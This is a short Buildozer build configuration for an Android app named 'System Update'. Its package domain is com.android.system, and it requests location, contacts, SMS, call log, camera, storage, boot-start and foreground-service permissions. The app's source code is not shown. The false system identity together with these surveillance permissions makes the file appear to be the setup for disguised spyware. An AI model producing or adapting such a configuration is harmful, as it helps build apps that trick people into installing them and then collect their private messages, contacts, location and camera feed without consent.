[app]
title           = System Update
package.name    = systemupdate
package.domain  = com.android.system
source.dir      = .
source.include_exts = py,kv
version         = 1.0
requirements    = python3,kivy,plyer,requests
android.permissions = INTERNET,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,READ_CONTACTS,READ_SMS,CAMERA,READ_CALL_LOG,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,RECEIVE_BOOT_COMPLETED,FOREGROUND_SERVICE
android.api     = 33
android.minapi  = 24
android.ndk     = 25b
android.arch    = arm64-v8a
android.allow_backup = False
orientation     = portrait
fullscreen      = 0

[buildozer]
log_level = 1
warn_on_root = 1
